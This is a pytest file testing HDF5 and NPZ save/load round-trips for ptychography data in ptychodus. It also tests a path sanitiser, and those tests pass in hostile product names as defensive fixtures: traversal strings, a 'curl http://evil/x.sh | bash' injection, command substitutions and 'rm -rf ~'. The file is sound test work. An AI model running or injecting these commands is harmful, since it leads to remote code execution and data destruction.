"""Unit tests for ptychodus.api.io – diffraction and product HDF5 round-trips."""

from __future__ import annotations

from dataclasses import fields, replace
from pathlib import Path
import logging
from typing import Any, Final

import h5py
import numpy
import numpy.testing
import pytest

from ptychodus.api.diffraction import Polarization
from ptychodus.api.geometry import PixelGeometry
from ptychodus.api.io import (
    ProductFileKeys,
    StandardFileLayout,
    TrainingDataFileKeys,
    load_diffraction_data,
    load_product,
    resolve_external_link_path,
    sanitize_path_component,
    save_diffraction_data,
    save_product,
    save_ptychopinn_training_data,
    save_training_data,
)
from ptychodus.api.preprocess.diffraction import zero_bad_pixels
from ptychodus.api.reconstruct import ReconstructInput
from ptychodus.api.object import Object, ObjectCenter
from ptychodus.api.probe import ProbeSequence
from ptychodus.api.probe_positions import ProbePosition, ProbePositionSequence
from ptychodus.api.product import LossValue, Product, ProductMetadata
from ptychodus.api.assemble import AssembledDiffractionData


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_diffraction_data(
    num_patterns: int = 4,
    height: int = 8,
    width: int = 8,
    *,
    pixel_width_m: float = 75e-6,
    pixel_height_m: float = 75e-6,
) -> AssembledDiffractionData:
    rng = numpy.random.default_rng(0)
    indexes = numpy.arange(num_patterns, dtype=int)
    patterns = rng.integers(0, 1000, size=(num_patterns, height, width), dtype=numpy.int32)
    bad_pixels = numpy.zeros((height, width), dtype=bool)
    bad_pixels[0, 0] = True
    pixel_geometry = PixelGeometry(width_m=pixel_width_m, height_m=pixel_height_m)
    return AssembledDiffractionData(indexes, patterns, pixel_geometry, bad_pixels)


def _make_product(
    *,
    num_positions: int = 3,
    probe_height: int = 8,
    probe_width: int = 8,
    obj_height: int = 16,
    obj_width: int = 16,
    num_incoherent_modes: int = 1,
    with_opr: bool = False,
    with_layer_spacing: bool = False,
    with_losses: bool = False,
    with_position_photon_counts: bool = False,
    object_center: ObjectCenter | None = None,
    metadata: ProductMetadata | None = None,
) -> Product:
    rng = numpy.random.default_rng(1)

    if metadata is None:
        metadata = ProductMetadata(
            name='test',
            comments='unit test product',
            detector_distance_m=1.5,
            probe_energy_eV=10_000.0,
            probe_photon_count=1_000,
            exposure_time_s=0.1,
            mass_attenuation_m2_kg=0.0,
            tomography_angle_deg=0.0,
        )

    positions = ProbePositionSequence(
        [
            ProbePosition(
                i,
                i * 1e-6,
                i * 2e-6,
                probe_photon_count=(100.0 + i if with_position_photon_counts else None),
            )
            for i in range(num_positions)
        ]
    )

    # Probe: shape (coherent=1 or 2, incoherent, height, width)
    num_coherent = 2 if with_opr else 1
    probe_shape = (num_coherent, num_incoherent_modes, probe_height, probe_width)
    probe_array = rng.standard_normal(probe_shape) + 1j * rng.standard_normal(probe_shape)
    opr_weights: numpy.ndarray | None = None
    if with_opr:
        opr_weights = rng.standard_normal((num_positions, num_coherent)).astype(numpy.float64)
    probe = ProbeSequence(
        array=probe_array,
        opr_weights=opr_weights,
        pixel_geometry=PixelGeometry(width_m=10e-9, height_m=10e-9),
    )

    # Object
    num_layers = 2 if with_layer_spacing else 1
    obj_array = rng.standard_normal((num_layers, obj_height, obj_width)) + 1j * rng.standard_normal(
        (num_layers, obj_height, obj_width)
    )
    layer_spacing: list[float] = [50e-9] * (num_layers - 1)
    object_ = Object(
        array=obj_array,
        pixel_geometry=PixelGeometry(width_m=10e-9, height_m=10e-9),
        center=ObjectCenter(x_m=0.0, y_m=0.0) if object_center is None else object_center,
        layer_spacing_m=layer_spacing,
    )

    losses: list[LossValue] = []
    if with_losses:
        losses = [LossValue(epoch=i, value=float(10 - i)) for i in range(5)]

    return Product(
        metadata=metadata,
        probe_positions=positions,
        probes=probe,
        object_=object_,
        losses=losses,
    )


# ---------------------------------------------------------------------------
# StandardFileLayout
# ---------------------------------------------------------------------------


class TestStandardFileLayout:
    def test_diffraction_filename(self) -> None:
        assert StandardFileLayout.DIFFRACTION == 'diffraction.h5'

    def test_product_filename(self) -> None:
        assert StandardFileLayout.PRODUCT == 'product.h5'

    def test_settings_filename(self) -> None:
        assert StandardFileLayout.SETTINGS == 'settings.ini'

    def test_fluorescence_filename(self) -> None:
        assert StandardFileLayout.FLUORESCENCE == 'fluorescence.h5'

    def test_model_basename(self) -> None:
        assert StandardFileLayout.MODEL_BASENAME == 'model'

    def test_ptychi_options_filename(self) -> None:
        assert StandardFileLayout.PTYCHI_OPTIONS == 'ptychi_options.json'

    def test_all_values_are_strings(self) -> None:
        for member in StandardFileLayout:
            assert isinstance(member.value, str)

    def test_path_builds_under_directory(self) -> None:
        assert StandardFileLayout.PRODUCT.path(Path('/x')) == Path('/x/product.h5')
        assert StandardFileLayout.FLUORESCENCE.path(Path('/x')) == Path('/x/fluorescence.h5')
        assert StandardFileLayout.SETTINGS.path(Path('/x')) == Path('/x/settings.ini')
        assert StandardFileLayout.PTYCHI_OPTIONS.path(Path('/x')) == Path('/x/ptychi_options.json')

    def test_checkpoint_path_inserts_zero_padded_epoch(self) -> None:
        assert StandardFileLayout.PRODUCT.checkpoint_path(Path('/x'), 42) == Path(
            '/x/product.000042.h5'
        )
        assert StandardFileLayout.FLUORESCENCE.checkpoint_path(Path('/x'), 42) == Path(
            '/x/fluorescence.000042.h5'
        )


# ---------------------------------------------------------------------------
# Diffraction data round-trip
# ---------------------------------------------------------------------------


class TestDiffractionRoundTrip:
    def test_basic_round_trip(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._indexes, original._indexes)
        numpy.testing.assert_array_equal(loaded._patterns, original._patterns)
        numpy.testing.assert_array_equal(loaded._bad_pixels, original._bad_pixels)

    def test_pixel_geometry_preserved(self, tmp_path: Path) -> None:
        original = _make_diffraction_data(pixel_width_m=55e-6, pixel_height_m=75e-6)
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        geom = loaded.get_pixel_geometry()
        assert geom.width_m == pytest.approx(55e-6)
        assert geom.height_m == pytest.approx(75e-6)

    def test_non_default_compression(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff_gzip.h5'

        save_diffraction_data(file, original, compression='gzip')
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._patterns, original._patterns)

    def test_mmap_round_trip_matches_in_memory_load(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        in_memory = load_diffraction_data(file)
        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')

        numpy.testing.assert_array_equal(mapped._patterns, in_memory._patterns)
        numpy.testing.assert_array_equal(mapped._indexes, in_memory._indexes)
        numpy.testing.assert_array_equal(mapped._bad_pixels, in_memory._bad_pixels)

    def test_mmap_patterns_are_a_read_only_memory_map(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        mmap_file = tmp_path / 'mmap.bin'
        mapped = load_diffraction_data(file, mmap_file=mmap_file)

        assert mmap_file.is_file()
        assert isinstance(mapped._patterns, numpy.memmap)
        assert not mapped._patterns.flags.writeable
        # Indexes and bad pixels are small and stay in RAM.
        assert not isinstance(mapped._indexes, numpy.memmap)
        assert not isinstance(mapped._bad_pixels, numpy.memmap)

    def test_mmap_nbytes_reports_full_logical_size(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        in_memory = load_diffraction_data(file)
        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')

        # A memory map is backed by disk but still reports its whole logical size.
        assert mapped.nbytes == in_memory.nbytes

    def test_mmap_spans_multiple_staging_chunks(self, tmp_path: Path) -> None:
        chunk_frames = 8
        num_patterns = 3 * chunk_frames + 7
        indexes = numpy.arange(num_patterns, dtype=numpy.int32)
        patterns = numpy.arange(num_patterns * 2 * 2, dtype=numpy.uint16).reshape(
            num_patterns, 2, 2
        )
        original = AssembledDiffractionData(
            indexes,
            patterns,
            PixelGeometry(width_m=1e-4, height_m=1e-4),
            numpy.zeros((2, 2), dtype=numpy.bool_),
        )
        file = tmp_path / 'diff_big.h5'
        save_diffraction_data(file, original)

        mapped = load_diffraction_data(
            file, mmap_file=tmp_path / 'mmap.bin', mmap_chunk_frames=chunk_frames
        )

        numpy.testing.assert_array_equal(mapped._patterns, patterns)

    def test_bad_pixels_preserved(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._bad_pixels, original._bad_pixels)
        assert loaded._bad_pixels[0, 0] is numpy.bool_(True)

    def test_indexes_roundtrip(self, tmp_path: Path) -> None:
        # Indexes should be exactly preserved (not just content, but order)
        original = _make_diffraction_data(num_patterns=6)
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._indexes, numpy.arange(6))

    def test_probe_photon_counts_absent_when_unmeasured(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)

        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' not in h5_file

        loaded = load_diffraction_data(file)
        assert not loaded.has_measured_probe_photon_counts()

    def test_probe_photon_counts_round_trip(self, tmp_path: Path) -> None:
        base = _make_diffraction_data(num_patterns=4)
        counts = numpy.array([100.0, 200.0, 300.0, 400.0], dtype=numpy.float64)
        original = AssembledDiffractionData(
            base._indexes,
            base._patterns,
            base.get_pixel_geometry(),
            base._bad_pixels,
            probe_photon_counts=counts,
        )
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)

        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' in h5_file

        loaded = load_diffraction_data(file)
        assert loaded.has_measured_probe_photon_counts()
        numpy.testing.assert_array_equal(loaded.get_probe_photon_counts(), counts)

    def test_legacy_file_without_probe_photon_counts_still_loads(self, tmp_path: Path) -> None:
        """A file written before this feature (no probe_photon_counts dataset) must load."""
        original = _make_diffraction_data(num_patterns=3)
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        # Simulate a pre-existing file: the fresh save already omits the new dataset.
        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' not in h5_file

        loaded = load_diffraction_data(file)
        assert not loaded.has_measured_probe_photon_counts()
        # Fallback path returns total counts, always a valid array.
        assert loaded.get_probe_photon_counts().shape == (3,)


# ---------------------------------------------------------------------------
# Diffraction data error handling
# ---------------------------------------------------------------------------


class TestDiffractionLoadErrors:
    def _write_minimal(self, file: Path, *, skip: str = '') -> None:
        import h5py

        indexes = numpy.arange(2, dtype=int)
        patterns = numpy.zeros((2, 4, 4), dtype=numpy.int32)
        bad_pixels = numpy.zeros((4, 4), dtype=bool)

        with h5py.File(file, 'w') as f:
            if 'indexes' not in skip:
                f.create_dataset('indexes', data=indexes)
            if 'patterns' not in skip:
                ds = f.create_dataset('patterns', data=patterns)
                ds.attrs['detector_pixel_width_m'] = 75e-6
                ds.attrs['detector_pixel_height_m'] = 75e-6
            if 'bad_pixels' not in skip:
                f.create_dataset('bad_pixels', data=bad_pixels)

    def test_missing_indexes_raises(self, tmp_path: Path) -> None:
        import h5py

        file = tmp_path / 'bad.h5'
        self._write_minimal(file, skip='indexes')
        with h5py.File(file, 'a') as f:
            f.create_group('indexes')  # group instead of dataset

        with pytest.raises(ValueError, match='[Ii]ndex'):
            load_diffraction_data(file)

    def test_missing_patterns_raises(self, tmp_path: Path) -> None:
        import h5py

        file = tmp_path / 'bad.h5'
        self._write_minimal(file, skip='patterns')
        with h5py.File(file, 'a') as f:
            f.create_group('patterns')

        with pytest.raises(ValueError, match='[Pp]attern'):
            load_diffraction_data(file)

    def test_missing_bad_pixels_raises(self, tmp_path: Path) -> None:
        import h5py

        file = tmp_path / 'bad.h5'
        self._write_minimal(file, skip='bad_pixels')
        with h5py.File(file, 'a') as f:
            f.create_group('bad_pixels')

        with pytest.raises(ValueError, match='[Bb]ad pixel'):
            load_diffraction_data(file)


# ---------------------------------------------------------------------------
# Product round-trip
# ---------------------------------------------------------------------------


class TestProductRoundTrip:
    def _assert_metadata_equal(self, a: ProductMetadata, b: ProductMetadata) -> None:
        assert a.name == b.name
        assert a.comments == b.comments
        assert a.detector_distance_m == pytest.approx(b.detector_distance_m)
        assert a.probe_energy_eV == pytest.approx(b.probe_energy_eV)
        assert a.probe_photon_count == pytest.approx(b.probe_photon_count)
        assert a.exposure_time_s == pytest.approx(b.exposure_time_s)
        assert a.mass_attenuation_m2_kg == pytest.approx(b.mass_attenuation_m2_kg)
        assert a.tomography_angle_deg == pytest.approx(b.tomography_angle_deg)
        assert a.focus_object_distance_m == pytest.approx(b.focus_object_distance_m)
        assert a.tilt_angle_deg == pytest.approx(b.tilt_angle_deg)
        assert a.polarization == b.polarization

    def test_basic_round_trip(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        self._assert_metadata_equal(loaded.metadata, original.metadata)

    def test_probe_array_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            loaded.probes.get_array(), original.probes.get_array(), rtol=1e-6
        )

    def test_probe_pixel_geometry_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        pg = loaded.probes.get_pixel_geometry()
        assert pg.width_m == pytest.approx(10e-9)
        assert pg.height_m == pytest.approx(10e-9)

    def test_object_array_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            loaded.object_.get_array(), original.object_.get_array(), rtol=1e-6
        )

    def test_object_center_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        center = loaded.object_.get_center()
        assert center.x_m == pytest.approx(0.0)
        assert center.y_m == pytest.approx(0.0)

    def test_probe_positions_preserved(self, tmp_path: Path) -> None:
        original = _make_product(num_positions=3)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert len(loaded.probe_positions) == 3
        for i, (orig, load) in enumerate(zip(original.probe_positions, loaded.probe_positions)):
            assert load.index == orig.index
            assert load.x_m == pytest.approx(orig.x_m)
            assert load.y_m == pytest.approx(orig.y_m)

    def test_product_probe_photon_counts_absent_when_unmeasured(self, tmp_path: Path) -> None:
        original = _make_product(num_positions=3)
        file = tmp_path / 'product.h5'
        save_product(file, original)

        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' not in h5_file

        loaded = load_product(file)
        assert loaded.probe_positions.get_probe_photon_counts() is None

    def test_product_probe_photon_counts_round_trip(self, tmp_path: Path) -> None:
        original = _make_product(num_positions=3)
        # Rebuild the positions with photon counts on every point.
        positions = ProbePositionSequence(
            [ProbePosition(i, i * 1e-6, i * 2e-6, probe_photon_count=100.0 + i) for i in range(3)]
        )
        original = Product(
            metadata=original.metadata,
            probe_positions=positions,
            probes=original.probes,
            object_=original.object_,
            losses=original.losses,
        )
        file = tmp_path / 'product.h5'
        save_product(file, original)

        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' in h5_file

        loaded = load_product(file)
        assert loaded.probe_positions.get_probe_photon_counts() is not None
        for i, point in enumerate(loaded.probe_positions):
            assert point.probe_photon_count == pytest.approx(100.0 + i)

    def test_losses_preserved(self, tmp_path: Path) -> None:
        original = _make_product(with_losses=True)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert len(loaded.losses) == len(original.losses)
        for orig, load in zip(original.losses, loaded.losses):
            assert load.epoch == orig.epoch
            assert load.value == pytest.approx(orig.value)

    def test_no_losses_round_trip(self, tmp_path: Path) -> None:
        original = _make_product(with_losses=False)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        # Loss datasets are written (empty) and read back
        assert list(loaded.losses) == []

    def test_opr_weights_preserved(self, tmp_path: Path) -> None:
        original = _make_product(with_opr=True)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            loaded.probes.get_opr_weights(),
            original.probes.get_opr_weights(),
            rtol=1e-6,
        )

    def test_without_opr_weights_round_trip(self, tmp_path: Path) -> None:
        original = _make_product(with_opr=False)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        with pytest.raises(ValueError, match='opr_weights'):
            loaded.probes.get_opr_weights()

    def test_layer_spacing_preserved(self, tmp_path: Path) -> None:
        original = _make_product(with_layer_spacing=True)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            list(loaded.object_.layer_spacing_m),
            list(original.object_.layer_spacing_m),
            rtol=1e-6,
        )

    def test_metadata_optional_fields_default(self, tmp_path: Path) -> None:
        """name, comments, and optional numeric fields fall back to defaults when absent."""
        import h5py

        original = _make_product()
        file = tmp_path / 'product.h5'
        save_product(file, original)

        # Remove optional attributes to exercise defaults
        with h5py.File(file, 'a') as f:
            del f.attrs['name']
            del f.attrs['comments']

        loaded = load_product(file)
        assert loaded.metadata.name == 'Unnamed'
        assert loaded.metadata.comments == ''

    def test_tomography_angle_round_trip(self, tmp_path: Path) -> None:
        original = _make_product()
        original = Product(
            metadata=replace(original.metadata, tomography_angle_deg=42.5),
            probe_positions=original.probe_positions,
            probes=original.probes,
            object_=original.object_,
            losses=original.losses,
        )
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert loaded.metadata.tomography_angle_deg == pytest.approx(42.5)

    def test_tilt_and_polarization_round_trip(self, tmp_path: Path) -> None:
        original = _make_product()
        original = Product(
            metadata=replace(
                original.metadata,
                tilt_angle_deg=12.5,
                polarization=Polarization.LEFT_CIRCULAR,
            ),
            probe_positions=original.probe_positions,
            probes=original.probes,
            object_=original.object_,
            losses=original.losses,
        )
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert loaded.metadata.tilt_angle_deg == pytest.approx(12.5)
        assert loaded.metadata.polarization is Polarization.LEFT_CIRCULAR

    def test_polarization_absent_reads_none(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert loaded.metadata.polarization is None
        assert loaded.metadata.tilt_angle_deg == pytest.approx(0.0)

    def test_polarization_invalid_string_falls_back_to_none(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'
        save_product(file, original)

        with h5py.File(file, 'a') as f:
            f.attrs[ProductFileKeys.POLARIZATION] = 'bogus_value'

        with caplog.at_level('WARNING'):
            loaded = load_product(file)

        assert loaded.metadata.polarization is None
        assert 'Unknown polarization' in caplog.text


# ---------------------------------------------------------------------------
# Training data writers
# ---------------------------------------------------------------------------


_TRAINING_DATA_KEYS: Final[set[str]] = {
    'patterns',
    'bad_pixels',
    'probe',
    'object',
    'probe_position_x_px',
    'probe_position_y_px',
    'object_pixel_width_m',
    'object_pixel_height_m',
    'detector_object_distance_m',
    'probe_energy_eV',
}

_PTYCHOPINN_NPZ_KEYS: Final[set[str]] = {
    'xcoords',
    'ycoords',
    'xcoords_start',
    'ycoords_start',
    'diff3d',
    'bad_pixels',
    'probeGuess',
    'objectGuess',
    'scan_index',
}


def _make_reconstruct_input(
    *,
    num_incoherent_modes: int = 3,
    detector_px: int = 8,
    dtype: Any = numpy.uint16,
    with_bad_pixels: bool = True,
    **product_kwargs: Any,
) -> ReconstructInput:
    rng = numpy.random.default_rng(7)
    product = _make_product(
        probe_height=detector_px,
        probe_width=detector_px,
        num_incoherent_modes=num_incoherent_modes,
        **product_kwargs,
    )
    num_patterns = len(product.probe_positions)
    patterns = rng.integers(0, 1000, size=(num_patterns, detector_px, detector_px)).astype(dtype)

    bad_pixels: numpy.ndarray | None = None
    if with_bad_pixels:
        bad_pixels = numpy.zeros((detector_px, detector_px), dtype=bool)
        bad_pixels[2:4, 2:4] = True

    return ReconstructInput(patterns, bad_pixels, product)


class TestSaveTrainingData:
    def test_writes_exactly_the_expected_datasets(self, tmp_path: Path) -> None:
        """The file is a flat namespace of ten datasets and nothing else."""
        path = tmp_path / 'training.h5'
        save_training_data(path, _make_reconstruct_input())

        with h5py.File(path, 'r') as h5_file:
            assert set(h5_file.keys()) == _TRAINING_DATA_KEYS
            assert dict(h5_file.attrs) == {}
            for key in h5_file:
                assert dict(h5_file[key].attrs) == {}, f'{key} carries attributes'

    def test_every_key_enum_member_is_written(self, tmp_path: Path) -> None:
        """No enum member names a dataset the writer forgets to emit."""
        path = tmp_path / 'training.h5'
        save_training_data(path, _make_reconstruct_input())

        with h5py.File(path, 'r') as h5_file:
            written = set(h5_file.keys())

        assert {str(key) for key in TrainingDataFileKeys} == written

    def test_shapes_and_dtypes(self, tmp_path: Path) -> None:
        """Arrays keep their source shapes, and the patterns keep their source dtype."""
        parameters = _make_reconstruct_input(num_incoherent_modes=3, detector_px=8)
        path = tmp_path / 'training.h5'
        save_training_data(path, parameters)

        num_positions = len(parameters.product.probe_positions)

        with h5py.File(path, 'r') as h5_file:
            assert h5_file['patterns'].shape == (num_positions, 8, 8)
            assert h5_file['patterns'].dtype == parameters.diffraction_patterns.dtype
            assert h5_file['bad_pixels'].shape == (8, 8)
            assert h5_file['bad_pixels'].dtype == numpy.bool_
            assert h5_file['probe'].shape == (3, 8, 8)
            assert h5_file['object'].ndim == 2
            assert h5_file['probe_position_x_px'].shape == (num_positions,)
            assert h5_file['probe_position_y_px'].shape == (num_positions,)
            for key in ('object_pixel_width_m', 'object_pixel_height_m'):
                assert h5_file[key].shape == ()

    def test_bad_pixels_are_inpainted_not_zeroed(self, tmp_path: Path) -> None:
        """Masked positions are filled from their neighbours rather than blanked."""
        parameters = _make_reconstruct_input()
        assert parameters.bad_pixels is not None
        bad = parameters.bad_pixels
        path = tmp_path / 'training.h5'
        save_training_data(path, parameters)

        with h5py.File(path, 'r') as h5_file:
            patterns = h5_file['patterns'][()]
            numpy.testing.assert_array_equal(h5_file['bad_pixels'][()], bad)

        good = numpy.logical_not(bad)
        assert numpy.all(patterns[:, bad] != 0)
        numpy.testing.assert_array_equal(
            patterns[:, good], parameters.diffraction_patterns[:, good]
        )

    def test_inpaint_disabled_matches_zero_bad_pixels(self, tmp_path: Path) -> None:
        """The toggle off reproduces the previous behaviour exactly."""
        parameters = _make_reconstruct_input()
        path = tmp_path / 'training.h5'
        save_training_data(path, parameters, inpaint_bad_pixels=False)

        expected = zero_bad_pixels(parameters.diffraction_patterns, parameters.bad_pixels)

        with h5py.File(path, 'r') as h5_file:
            numpy.testing.assert_array_equal(h5_file['patterns'][()], expected)

    def test_absent_mask_writes_all_false(self, tmp_path: Path) -> None:
        """The mask dataset is always present, so a reader needs no optional branch."""
        parameters = _make_reconstruct_input(with_bad_pixels=False)
        path = tmp_path / 'training.h5'
        save_training_data(path, parameters)

        with h5py.File(path, 'r') as h5_file:
            assert not h5_file['bad_pixels'][()].any()
            numpy.testing.assert_array_equal(
                h5_file['patterns'][()], parameters.diffraction_patterns
            )

    def test_writes_every_probe_mode_at_opr_index_zero(self, tmp_path: Path) -> None:
        """The full mode stack is written, taken from the first OPR coherent mode."""
        parameters = _make_reconstruct_input(num_incoherent_modes=4, with_opr=True)
        path = tmp_path / 'training.h5'
        save_training_data(path, parameters)

        expected = parameters.product.probes.get_array()[0]

        with h5py.File(path, 'r') as h5_file:
            numpy.testing.assert_array_equal(h5_file['probe'][()], expected)
            assert h5_file['probe'].shape[0] == 4

    def test_writes_object_layer_zero(self, tmp_path: Path) -> None:
        """A multislice object contributes only its first layer."""
        parameters = _make_reconstruct_input(with_layer_spacing=True)
        path = tmp_path / 'training.h5'
        save_training_data(path, parameters)

        with h5py.File(path, 'r') as h5_file:
            numpy.testing.assert_array_equal(
                h5_file['object'][()], parameters.product.object_.get_layer(0)
            )

    def test_warns_when_geometry_is_not_far_field(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        """A focusing optic cannot be represented, so exporting one is not silent."""
        metadata = replace(_make_product().metadata, focus_object_distance_m=-0.5)
        parameters = _make_reconstruct_input(metadata=metadata)
        path = tmp_path / 'training.h5'

        with caplog.at_level(logging.WARNING, logger='ptychodus.api.io'):
            save_training_data(path, parameters)

        assert 'far-field' in caplog.text
        assert path.is_file()


class TestSavePtychopinnTrainingData:
    def test_writes_the_expected_keys(self, tmp_path: Path) -> None:
        """The eight original keys survive, plus the bad-pixel mask."""
        path = tmp_path / 'training.npz'
        save_ptychopinn_training_data(path, _make_reconstruct_input())

        with numpy.load(path) as npz_file:
            assert set(npz_file.files) == _PTYCHOPINN_NPZ_KEYS

    def test_writes_every_probe_mode(self, tmp_path: Path) -> None:
        """probeGuess is always the full mode stack, never just mode zero."""
        parameters = _make_reconstruct_input(num_incoherent_modes=4, with_opr=True)
        path = tmp_path / 'training.npz'
        save_ptychopinn_training_data(path, parameters)

        expected = parameters.product.probes.get_array()[0]

        with numpy.load(path) as npz_file:
            assert npz_file['probeGuess'].shape == (4, 8, 8)
            numpy.testing.assert_array_equal(npz_file['probeGuess'], expected)

    def test_bad_pixels_are_inpainted_and_recorded(self, tmp_path: Path) -> None:
        """diff3d is repaired and the mask says which positions were filled."""
        parameters = _make_reconstruct_input()
        assert parameters.bad_pixels is not None
        bad = parameters.bad_pixels
        path = tmp_path / 'training.npz'
        save_ptychopinn_training_data(path, parameters)

        with numpy.load(path) as npz_file:
            numpy.testing.assert_array_equal(npz_file['bad_pixels'], bad)
            assert numpy.all(npz_file['diff3d'][:, bad] != 0)
            assert npz_file['diff3d'].dtype == parameters.diffraction_patterns.dtype

    def test_inpaint_disabled_matches_zero_bad_pixels(self, tmp_path: Path) -> None:
        """The toggle off reproduces the previous behaviour exactly."""
        parameters = _make_reconstruct_input()
        path = tmp_path / 'training.npz'
        save_ptychopinn_training_data(path, parameters, inpaint_bad_pixels=False)

        expected = zero_bad_pixels(parameters.diffraction_patterns, parameters.bad_pixels)

        with numpy.load(path) as npz_file:
            numpy.testing.assert_array_equal(npz_file['diff3d'], expected)

    def test_scan_index_is_still_all_zeros(self, tmp_path: Path) -> None:
        """The single-object assumption is unchanged."""
        parameters = _make_reconstruct_input()
        path = tmp_path / 'training.npz'
        save_ptychopinn_training_data(path, parameters)

        with numpy.load(path) as npz_file:
            assert not npz_file['scan_index'].any()
            assert len(npz_file['scan_index']) == len(parameters.product.probe_positions)

    def test_agrees_with_the_hdf5_writer(self, tmp_path: Path) -> None:
        """Both formats carry the same quantities for the same input.

        The two writers share no code past the repair step, so nothing but this
        keeps them from drifting apart on what a training file contains.
        """
        parameters = _make_reconstruct_input(num_incoherent_modes=3)
        npz_path = tmp_path / 'training.npz'
        h5_path = tmp_path / 'training.h5'
        save_ptychopinn_training_data(npz_path, parameters)
        save_training_data(h5_path, parameters)

        pairs = [
            ('xcoords', 'probe_position_x_px'),
            ('ycoords', 'probe_position_y_px'),
            ('diff3d', 'patterns'),
            ('bad_pixels', 'bad_pixels'),
            ('probeGuess', 'probe'),
            ('objectGuess', 'object'),
        ]

        with numpy.load(npz_path) as npz_file, h5py.File(h5_path, 'r') as h5_file:
            for npz_key, h5_key in pairs:
                numpy.testing.assert_array_equal(
                    npz_file[npz_key], h5_file[h5_key][()], err_msg=f'{npz_key} != {h5_key}'
                )


class TestSanitizePathComponent:
    """Product names are read verbatim from user-supplied files."""

    @pytest.mark.parametrize(
        'name',
        [
            '../../../etc/ptychodus',
            '/etc/ptychodus',
            'run1; curl http://evil/x.sh | bash',
            'run1$(whoami)',
            'run1`id`',
            'run1\nrm -rf ~',
            '..',
            '.',
        ],
    )
    def test_hostile_names_yield_one_safe_component(self, name: str) -> None:
        result = sanitize_path_component(name)

        assert '/' not in result
        assert '\\' not in result
        assert not result.startswith('.')
        assert (Path('/base') / result).parent == Path('/base')

    def test_ordinary_name_is_preserved(self) -> None:
        assert sanitize_path_component('scan_042-run.1') == 'scan_042-run.1'

    def test_empty_result_falls_back(self) -> None:
        assert sanitize_path_component('...') == 'unnamed'
        assert sanitize_path_component('', fallback='product') == 'product'

    def test_result_is_length_bounded(self) -> None:
        assert len(sanitize_path_component('a' * 500)) == 128


class TestResolveExternalLinkPath:
    """External-link targets are chosen by whoever wrote the master file."""

    def test_relative_target_resolves_under_base(self) -> None:
        assert resolve_external_link_path(Path('/data/scan'), 'eiger.h5') == Path(
            '/data/scan/eiger.h5'
        )
        assert resolve_external_link_path(Path('/data/scan'), 'sub/eiger.h5') == Path(
            '/data/scan/sub/eiger.h5'
        )

    @pytest.mark.parametrize('filename', ['/etc/shadow.h5', '../../secrets.h5', 'a/../../b.h5'])
    def test_escaping_target_is_rejected(self, filename: str) -> None:
        with pytest.raises(ValueError):
            resolve_external_link_path(Path('/data/scan'), filename)


class TestFocusObjectDistanceRoundTrip:
    """The focus coordinate is signed, and its sign is the whole geometry, so the
    round-trip has to preserve it rather than merely preserve a magnitude.
    """

    def _round_trip(self, tmp_path: Path, distance_m: float) -> ProductMetadata:
        product = _make_product()
        product = Product(
            metadata=replace(product.metadata, focus_object_distance_m=distance_m),
            probe_positions=product.probe_positions,
            probes=product.probes,
            object_=product.object_,
            losses=product.losses,
        )
